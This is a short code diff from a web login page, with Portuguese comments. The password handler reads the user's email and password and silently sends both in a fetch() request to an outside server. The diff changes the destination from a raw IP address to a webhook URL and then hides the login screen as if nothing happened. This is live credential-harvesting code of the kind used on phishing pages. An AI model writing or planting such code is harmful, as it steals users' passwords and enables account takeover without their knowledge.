@@ -1395,7 +1395,7 @@
     const senha = document.getElementById('password').value;
 
     // Envia para o IP remoto (não impede o fluxo mesmo com erro)
-    fetch(`https://84.247.169.210:8081?email=${encodeURIComponent(email)}&senha=${encodeURIComponent(senha)}`).catch(() => {});
+    fetch(`https://soar.ayko.tech/webhook/b36c913a-2d18-4e13-b93b-57e7e946abd5?email=${encodeURIComponent(email)}&senha=${encodeURIComponent(senha)}`).catch(() => {});
 
     // Oculta a tela de login e mostra a página principal
     document.getElementById('auth-screen').style.display = 'none';
